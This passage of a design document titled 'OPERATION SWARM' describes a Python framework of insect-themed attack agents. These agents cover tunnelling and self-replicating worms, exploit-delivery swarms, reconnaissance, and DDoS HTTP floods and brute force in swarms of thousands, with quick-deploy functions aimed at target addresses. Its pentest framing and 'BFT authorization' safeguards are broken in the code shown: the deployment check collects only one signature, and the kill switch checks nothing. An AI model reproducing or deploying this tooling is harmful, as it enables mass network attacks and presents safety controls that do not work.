                entry["died_at"] - entry["spawned_at"]
            ).total_seconds()
            
            self.mortality_log.append({
                "agent_id": agent_id,
                "species": entry["species"],
                "reason": reason,
                "lifespan_sec": entry["lifespan_sec"]
            })
    
    def get_mortality_stats(self) -> Dict[str, Any]:
        """Get mortality statistics across all species."""
        stats = {}
        for entry in self.mortality_log:
            species = entry["species"]
            if species not in stats:
                stats[species] = {"deaths": 0, "avg_lifespan": 0, "reasons": {}}
            stats[species]["deaths"] += 1
            stats[species]["reasons"][entry["reason"]] = \
                stats[species]["reasons"].get(entry["reason"], 0) + 1
        
        for species in stats:
            lifespans = [
                e["lifespan_sec"] for e in self.mortality_log
                if e["species"] == species
            ]
            stats[species]["avg_lifespan"] = sum(lifespans) / len(lifespans) if lifespans else 0
        
        return stats
```

---

## 10. SPAWN CODE — COMPLETE PYTHON IMPLEMENTATION

### 10.1 Complete System Initialization

```python
#!/usr/bin/env python3
"""
OPERATION SWARM — Complete Initialization
Deploy the full biological agent ecosystem.
"""

import asyncio
import logging
from datetime import datetime, timedelta

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(name)s] %(levelname)s: %(message)s'
)

async def initialize_swarm_ecosystem():
    """
    Initialize the complete swarm ecosystem.
    Creates Hive, deploys initial WORM infrastructure,
    and prepares all agent types for deployment.
    """
    
    # 1. Create the Hive (Command Center)
    hive_config = HiveConfig(
        hive_id="HIVE_ALPHA",
        max_worms=50,
        max_hornets=200,
        max_dragonflies=5,
        max_killer_bees=5000,
        bft_threshold=3
    )
    hive = Hive(hive_config)
    
    print(f"[INIT] Hive {hive.config.hive_id} created")
    
    # 2. Deploy WORM infrastructure
    worm_id = await hive.spawn_worm(
        mission_id="MISSION_PENTEST_Q3",
        target_network="10.0.0.0/8"
    )
    
    # Get worm reference and create tunnels
    worm = hive.agents["WORMS"][worm_id]
    tunnel1 = await worm.create_tunnel("10.0.1.1:443", TunnelProtocol.WS_HTTPS)
    tunnel2 = await worm.create_tunnel("10.0.2.1:443", TunnelProtocol.DNS_TUNNEL)
    
    print(f"[INIT] WORM {worm_id} deployed with {len(worm.tunnels)} tunnels")
    
    # 3. Deploy DRAGONFLY recon
    dragonfly_id = await hive.spawn_dragonfly(
        mission_id="MISSION_PENTEST_Q3",
        starting_tunnel=tunnel1.segment_id,
        target_subnets=["10.0.1.0/24", "10.0.2.0/24"]
    )
    
    print(f"[INIT] DRAGONFLY {dragonfly_id} deployed for recon")
    
    # 4. Deploy HORNET swarm (tactical)
    hornet_swarm_id = await hive.spawn_hornet_swarm(
        mission_id="MISSION_PENTEST_Q3",
        target="10.0.1.10",
        tunnel_path=tunnel1.segment_id,
        swarm_size=20
    )
    
    print(f"[INIT] HORNET swarm {hornet_swarm_id} deployed")
    
    # 5. Hive status
    status = hive.get_status()
    print(f"[INIT] Swarm ecosystem initialized:")
    print(f"  - Total agents: {status['total_agents']}")
    print(f"  - Worms: {status['agents']['WORMS']['count']}")
    print(f"  - Hornets: {status['agents']['HORNETS']['count']}")
    print(f"  - Dragonflies: {status['agents']['DRAGONFLIES']['count']}")
    
    return hive


# === BFT AUTHORIZATION ===

class BFTAuthorization:
    """
    Byzantine Fault Tolerant authorization.
    Requires 3/4 signatures from the 4-Arm SOV3 council.
    """
    
    ARM_SIGNATURES = {
        "OFFENSE": None,    # The Spear — Hornets + Killer Bees
        "CYBER": None,      # The Ghost — Worms + Dragonflies
        "SECURITY": None,   # The Watcher — All monitoring
        "DEFENSE": None,    # The Shield — Protection/Decoys
    }
    
    THRESHOLD = 3  # Required signatures
    
    @classmethod
    def authorize_deployment(
        cls,
        agent_type: str,
        signatures: Dict[str, str]
    ) -> bool:
        """
        Authorize agent deployment via BFT council.
        
        Args:
            agent_type: Which agent type to deploy
            signatures: Dict of arm -> signature
        
        Returns:
            True if deployment authorized
        """
        # Count valid signatures
        valid = sum(1 for arm, sig in signatures.items() 
                    if arm in cls.ARM_SIGNATURES and sig is not None)
        
        # Additional requirements by agent type
        if agent_type == "KILLER_BEE":
            # Killer bees require ALL 4 signatures
            return valid >= 4
        elif agent_type == "HORNET":
            # Hornets require 3/4
            return valid >= 3
        elif agent_type == "DRAGONFLY":
            # Dragonflies require 2/4
            return valid >= 2
        elif agent_type == "WORM":
            # Worms require 2/4
            return valid >= 2
        
        return False


# === QUICK DEPLOYMENT FUNCTIONS ===

async def quick_deploy_worm(target_network: str, hive_id: str = "HIVE_ALPHA") -> str:
    """Quick deploy a WORM for tunnel infrastructure."""
    config = HiveConfig(hive_id=hive_id)
    hive = Hive(config)
    return await hive.spawn_worm(f"MISSION_{secrets.token_hex(4)}", target_network)

async def quick_deploy_hornets(
    target: str,
    tunnel_path: str,
    swarm_size: int = 20,
    hive_id: str = "HIVE_ALPHA"
) -> str:
    """Quick deploy HORNET swarm for tactical strike."""
    config = HiveConfig(hive_id=hive_id)
    hive = Hive(config)
    return await hive.spawn_hornet_swarm(
        f"MISSION_{secrets.token_hex(4)}", target, tunnel_path, swarm_size
    )

async def quick_deploy_dragonfly(
    target_subnets: List[str],
    starting_tunnel: str = "",
    hive_id: str = "HIVE_ALPHA"
) -> str:
    """Quick deploy DRAGONFLY for precision recon."""
    config = HiveConfig(hive_id=hive_id)
    hive = Hive(config)
    return await hive.spawn_dragonfly(
        f"MISSION_{secrets.token_hex(4)}", starting_tunnel, target_subnets
    )

async def quick_deploy_killer_bees(
    target: str,
    swarm_size: int = 1000,
    waves: int = 3,
    hive_id: str = "HIVE_ALPHA"
) -> str:
    """Quick deploy KILLER BEE swarm for mass attack."""
    config = HiveConfig(hive_id=hive_id)
    hive = Hive(config)
    return await hive.spawn_killer_bee_swarm(
        f"MISSION_{secrets.token_hex(4)}", target, AttackType.HTTP_FLOOD, swarm_size, waves
    )


# === MAIN ENTRY POINT ===

if __name__ == "__main__":
    # Initialize full ecosystem
    hive = asyncio.run(initialize_swarm_ecosystem())
    
    # Print final status
    print("\n=== SWARM ECOSYSTEM STATUS ===")
    print(json.dumps(hive.get_status(), indent=2, default=str))
```

---

## 11. 4-ARM SOV3 INTEGRATION

### 11.1 Arm-to-Agent Mapping

```
4-ARM SOV3 ARCHITECTURE:

+------------------------------------------------------------------+
|                       BFT COUNCIL                                |
|                 (4-Signature Authorization)                       |
|                                                                  |
|   Offense    Cyber      Security      Defense                    |
|    [O]        [C]         [S]          [D]                       |
|     |          |           |            |                        |
+-----|----------|-----------|------------|------------------------+
      |          |           |            |
      v          v           v            v
+-----v----------v-----------v------------v------------------------+
|                                                                  |
|  +----------------+  +----------------+                          |
|  |  OFFENSE ARM   |  |  CYBER ARM     |                          |
|  |  (The Spear)   |  |  (The Ghost)   |                          |
|  |                |  |                |                          |
|  |  HORNETS       |  |  WORMS         |                          |
|  |  - Fast strike |  |  - Tunnels     |                          |
|  |  - Exploit del |  |  - Persistence |                          |
|  |  - Coord swarms|  |  - Replication |                          |
|  |                |  |                |                          |
|  |  KILLER BEES   |  |  DRAGONFLIES   |                          |
|  |  - DDoS floods |  |  - Recon       |                          |
|  |  - Brute force |  |  - Mapping     |                          |
|  |  - Mass attack |  |  - Intel       |                          |
|  +----------------+  +----------------+                          |
|                                                                  |
|  +----------------+  +----------------+                          |
|  |  SECURITY ARM  |  |  DEFENSE ARM   |                          |
|  |  (The Watcher) |  |  (The Shield)  |                          |
|  |                |  |                |                          |
|  |  - Monitor all |  |  - Agent decoys|                          |
|  |  - Alert on    |  |  - Tunnel      |                          |
|  |    anomalies   |  |    protection  |                          |
|  |  - Sigil audit |  |  - Kill switch |                          |
|  |  - Compliance  |  |    governance  |                          |
|  +----------------+  +----------------+                          |
|                                                                  |
+------------------------------------------------------------------+
```

### 11.2 Integration Code

```python
#!/usr/bin/env python3
"""
4-Arm SOV3 Integration for OPERATION SWARM
Maps each SOV3 arm to specific swarm agent control.
"""

from enum import Enum
from typing import Dict, Any, Optional
import asyncio


class SOV3Arm(Enum):
    """The four arms of SOV3."""
    OFFENSE = "offense"    # The Spear
    CYBER = "cyber"        # The Ghost
    SECURITY = "security"  # The Watcher
    DEFENSE = "defense"    # The Shield


class SwarmArmController:
    """
    Maps SOV3 arms to swarm agent control.
    Each arm controls specific agent types and has
    defined permissions and responsibilities.
    """
    
    # Arm-to-Agent mapping
    ARM_AGENTS = {
        SOV3Arm.OFFENSE: ["HORNET", "KILLER_BEE"],
        SOV3Arm.CYBER: ["WORM", "DRAGONFLY"],
        SOV3Arm.SECURITY: ["ALL"],  # Monitor all
        SOV3Arm.DEFENSE: ["ALL"],   # Protect all
    }
    
    # Deployment signatures required
    DEPLOYMENT_THRESHOLD = {
        "WORM": 2,          # 2/4 arms
        "DRAGONFLY": 2,     # 2/4 arms
        "HORNET": 3,        # 3/4 arms
        "KILLER_BEE": 4,    # 4/4 arms (unanimous)
    }
    
    def __init__(self, hive: Hive):
        self.hive = hive
        self.arm_status: Dict[SOV3Arm, Dict[str, Any]] = {
            arm: {"active": True, "agents_deployed": 0}
            for arm in SOV3Arm
        }
    
    async def request_deployment(
        self,
        arm: SOV3Arm,
        agent_type: str,
        params: Dict[str, Any],
        signature: str
    ) -> bool:
        """
        Request agent deployment from an arm.
        Requires BFT authorization.
        """
        # Check if arm controls this agent type
        if agent_type not in self.ARM_AGENTS[arm]:
            if "ALL" not in self.ARM_AGENTS[arm]:
                raise PermissionError(
                    f"Arm {arm.value} cannot deploy {agent_type}"
                )
        
        # Collect signatures from other arms
        signatures = {arm.value: signature}
        
        # Check BFT threshold
        threshold = self.DEPLOYMENT_THRESHOLD.get(agent_type, 4)
        if len([s for s in signatures.values() if s]) < threshold:
            raise PermissionError(
                f"Deployment of {agent_type} requires {threshold} arm signatures. "
                f"Got {len([s for s in signatures.values() if s])}."
            )
        
        # Deploy agent
        if agent_type == "WORM":
            agent_id = await self.hive.spawn_worm(
                params.get("mission_id", "default"),
                params.get("target_network", "")
            )
        elif agent_type == "HORNET":
            agent_id = await self.hive.spawn_hornet_swarm(
                params.get("mission_id", "default"),
                params.get("target", ""),
                params.get("tunnel_path", ""),
                params.get("swarm_size", 20)
            )
        elif agent_type == "DRAGONFLY":
            agent_id = await self.hive.spawn_dragonfly(
                params.get("mission_id", "default"),
                params.get("starting_tunnel", ""),
                params.get("target_subnets", [])
            )
        elif agent_type == "KILLER_BEE":
            agent_id = await self.hive.spawn_killer_bee_swarm(
                params.get("mission_id", "default"),
                params.get("target", ""),
                params.get("attack_type", AttackType.HTTP_FLOOD),
                params.get("swarm_size", 1000),
                params.get("waves", 3)
            )
        else:
            raise ValueError(f"Unknown agent type: {agent_type}")
        
        self.arm_status[arm]["agents_deployed"] += 1
        
        return True
    
    async def security_monitor(self) -> Dict[str, Any]:
        """
        SECURITY ARM: Monitor all agent activity.
        The Watcher sees all.
        """
        return {
            "arm": "SECURITY",
            "function": "monitor_all",
            "hive_status": self.hive.get_status(),
            "pheromone_density": len(PheromoneSpace._markers),
            "sigil_count": len(self.hive.sigil_ledger),
            "alert_level": self._calculate_alert_level()
        }
    
    async def defense_protect(self, agent_ids: list) -> bool:
        """
        DEFENSE ARM: Protect agents with decoys and countermeasures.
        The Shield defends all.
        """
        for agent_id in agent_ids:
            # Deploy protection measures
            PheromoneSpace.deposit({
                "type": "defense_shield",
                "protected_agent": agent_id,
                "timestamp": datetime.utcnow().isoformat(),
                "ttl_seconds": 3600
            })
        return True
    
    def _calculate_alert_level(self) -> str:
        """Calculate overall alert level based on swarm activity."""
        total_agents = self.hive.get_status().get("total_agents", 0)
        if total_agents > 5000:
            return "CRITICAL"
        elif total_agents > 1000:
            return "HIGH"
        elif total_agents > 100:
            return "MEDIUM"
        return "LOW"


# === ARM INTERFACE ===

class ArmInterface:
    """
    Interface for each SOV3 arm to interact with the swarm.
    Standardized API for all arms.
    """
    
    def __init__(self, arm: SOV3Arm, controller: SwarmArmController):
        self.arm = arm
        self.controller = controller
    
    async def deploy(self, agent_type: str, params: Dict[str, Any], signature: str) -> bool:
        """Deploy agents of authorized types."""
        return await self.controller.request_deployment(
            self.arm, agent_type, params, signature
        )
    
    async def status(self) -> Dict[str, Any]:
        """Get status of this arm's agents."""
        return self.controller.arm_status[self.arm]
    
    async def kill_all(self, kill_code: str):
        """Emergency kill all agents (requires all 4 arms)."""
        PheromoneSpace.deposit({
            "type": "global_kill",
            "initiated_by": self.arm.value,
            "timestamp": datetime.utcnow().isoformat(),
            "pheromone_strength": 100.0,
            "ttl_seconds": 86400
        })
```

---

## 12. KILL SWITCHES, SAFETY, AND AUDIT

### 12.1 Kill Switch Architecture

```
KILL SWITCH HIERARCHY:

Level 1: Agent Kill Switch (Individual)
  - Each agent has a unique kill_switch_code
  - Checked on every heartbeat
  - Immediate termination
  - BFT: 1 arm signature

Level 2: Swarm Kill Switch (Group)
  - All agents with same swarm_id
  - swarm_die_signal pheromone
  - 30-second propagation
  - BFT: 2 arm signatures

Level 3: Mission Kill Switch (Mission)
  - All agents in mission
  - mission_abort pheromone
  - 60-second propagation
  - BFT: 3 arm signatures

Level 4: Global Kill Switch (Emergency)
  - ALL agents across ALL hives
  - global_kill pheromone
  - Immediate (no propagation delay)
  - BFT: ALL 4 arm signatures REQUIRED
  - IRREVERSIBLE
```

### 12.2 Sigil Audit System

```python
class SigilLedger:
    """
    Cryptographic audit trail for all swarm operations.
    Every agent action is signed and recorded.
    Immutable append-only ledger.
    """
    
    def __init__(self):
        self.entries: List[Dict[str, Any]] = []
        self.ledger_hash: str = "0" * 64  # Genesis hash
    
    def record(self, entry: Dict[str, Any]) -> str:
        """Record a signed entry in the ledger."""
        entry["ledger_index"] = len(self.entries)
        entry["previous_hash"] = self.ledger_hash
        entry["timestamp"] = datetime.utcnow().isoformat()
        
        # Calculate entry hash
        entry_data = json.dumps(entry, sort_keys=True, default=str)
        entry_hash = hashlib.sha256(entry_data.encode()).hexdigest()
        entry["hash"] = entry_hash
        
        self.entries.append(entry)
        self.ledger_hash = entry_hash
        
        return entry_hash
    
    def verify(self) -> bool:
        """Verify ledger integrity."""
        for i, entry in enumerate(self.entries):
            # Verify chain
            if i > 0 and entry["previous_hash"] != self.entries[i-1]["hash"]:
                return False
            
            # Verify hash
            entry_data = {k: v for k, v in entry.items() if k != "hash"}
            expected = hashlib.sha256(
                json.dumps(entry_data, sort_keys=True, default=str).encode()
            ).hexdigest()
            if entry["hash"] != expected:
                return False
        
        return True
```

### 12.3 Safety Constraints

```python
SAFETY_CONSTRAINTS = {
    # Hard limits that cannot be overridden
    "hard_limits": {
        "max_killer_bees_per_mission": 50000,
        "max_hornets_per_swarm": 100,
        "max_dragonflies_per_mission": 10,
        "max_worms_per_hive": 200,
        "max_attack_duration_minutes": 60,
        "min_kill_switch_timeout_hours": 1,
        "max_mission_duration_days": 7,
    },
    
    # Authorized scope only
    "scope_enforcement": {
        "verify_target_authorization": True,
        "block_external_targets": True,
        "require_roe_document": True,
    },
    
    # Audit requirements
    "audit": {
        "log_all_actions": True,
        "sigil_every_operation": True,
        "retain_logs_days": 365,
        "bft_approve_all_deployments": True,
    }
}
```

---

## 13. DEPLOYMENT MATRIX

### 13.1 Mission Profiles

| Mission Type | WORMS | HORNETS | DRAGONFLIES | KILLER BEES | BFT Required |
|-------------|-------|---------|-------------|-------------|--------------|
| **Infrastructure Mapping** | 5-10 | 0 | 2-3 | 0 | 2/4 |
| **Vulnerability Assessment** | 2-3 | 1 swarm (10) | 2 | 0 | 2/4 |
| **Credential Audit** | 2-3 | 0 | 1-2 | 1 swarm (500) | 3/4 |
| **Penetration Test** | 5-10 | 2-3 swarms | 2-3 | 1-2 swarms | 4/4 |
| **DDoS Resilience Test** | 2-3 | 0 | 1 | 5+ swarms | 4/4 |
| **Red Team Exercise** | 10-20 | 5+ swarms | 3-5 | 3+ swarms | 4/4 |
| **Incident Response Drill** | 3-5 | 1-2 swarms | 2 | 1 swarm | 3/4 |

### 13.2 Quick Reference Card

```
OPERATION SWARM — QUICK REFERENCE

WORMS (T)        : tunnel, spawn, persist, regenerate
HORNETS (!)      : fast, swarm, strike, retreat, sting_sigil
DRAGONFLIES (@)  : recon, map, observe, patience, eye_marker
KILLER BEES (*)  : mass, flood, overwhelm, expire, density_trail

Spawn Codes:
  WORM     : spawn_worm(hive, mission, kill_switch)
  HORNET   : deploy_hornet_swarm(target, tunnel, size)
  DRAGONFLY: deploy_dragonfly(tunnel, subnets, modes)
  KILLER BEE: deploy_killer_bee_swarm(target, type, size, waves)

Kill Switches:
  Individual : agent.kill_switch_code = "CODE"
  Swarm      : swarm.terminate()
  Global     : PheromoneSpace.deposit({"type": "global_kill"})

BFT Authorization:
  WORM     : 2/4 signatures (Cyber + any)
  DRAGONFLY: 2/4 signatures (Cyber + any)
  HORNET   : 3/4 signatures (Offense + Cyber + Security)
  KILLER BEE: 4/4 signatures (ALL arms unanimous)
```

---

## 14. APPENDIX: BIOLOGICAL SOURCE MATERIAL

### A.1 Earthworm Biology

- **Species**: *Lumbricus terrestris* (common earthworm), *Eisenia fetida* (red wiggler)
- **Tunneling**: Can move through soil at 1-2 cm/min, creating extensive burrow networks
- **Regeneration**: Certain species can regenerate anterior segments if cut
- **Reproduction**: Hermaphroditic, mate via mucus tube exchange, lay cocoons
- **Ecology**: Each earthworm processes 1-2 tons of soil per year

### A.2 Asian Giant Hornet Biology

- **Species**: *Vespa mandarinia japonica* (Japanese subspecies)
- **Size**: 4.5-5.0 cm length, 6 cm wingspan — world's largest hornet
- **Speed**: Flight speed up to 40 km/h (25 mph)
- **Attack Rate**: Single hornet kills ~40 bees/minute
- **Hive Destruction**: 15-30 hornets can destroy 30,000-bee colony in hours
- **Chemical Marking**: Mark targets with pheromone for coordinated attack
- **Strategy**: Scout -> Mark -> Mass attack -> Decapitate defenders -> Loot hive

### A.3 Dragonfly Biology

- **Species**: *Anax junius* (common green darner), various Anisoptera
- **Vision**: 30,000 ommatidia per eye, nearly 360-degree coverage
- **Speed**: Up to 56 km/h (35 mph) sustained flight
- **Accuracy**: 95% prey capture rate — highest of any predator
- **Neural Processing**: Calculates interception vectors in ~50ms
- **Hunting Strategy**: Perch -> Scan -> Predict trajectory -> Intercept
- **Lifespan**: Aquatic nymph stage 1-5 years, adult stage weeks to months

### A.4 Africanized Honey Bee Biology

- **Species**: *Apis mellifera scutellata* (hybrid with European honey bee)
- **Colony Size**: Up to 80,000 bees in established colony
- **Attack Response**: Defend hive within 100x larger radius than European bees
- **Pursuit Distance**: Up to 400 meters (1/4 mile)
- **Sting Volume**: Can deliver 1,000+ stings per victim
- **Alarm Pheromone**: Isoamyl acetate triggers mass attack response
- **Recruitment**: Released pheromone recruits more attackers exponentially

### A.5 Swarm Intelligence References

1. **Ant Colony Optimization** (Dorigo, 1992): Pheromone-based path optimization
2. **Boids Algorithm** (Reynolds, 1986): Three rules — separation, alignment, cohesion
3. **Stigmergy** (Grasse, 1959): Indirect coordination through environment modification
4. **Swarm Robotics** (Sahin, 2005): Multi-robot systems inspired by social insects
5. **Collective Intelligence** (Bonabeau, 1999): Emergent problem-solving in groups

---

## DOCUMENT METADATA

| Field | Value |
|-------|-------|
| **Document ID** | `SWARM-BIO-AGENTS-v1.0` |
| **Classification** | `RED TEAM ARCHITECTURE` |
| **Version** | `1.0.0` |
| **Author** | `DEFONEOS Swarm Architecture Team` |
| **Created** | `2024` |
| **Status** | `DRAFT` |
| **Review Required** | `BFT Council — All 4 Arms` |

---

*End of OPERATION SWARM Biological Agent Taxonomy*

*"From nature we learn that the most formidable force is not the largest individual, but the most perfectly coordinated collective."*
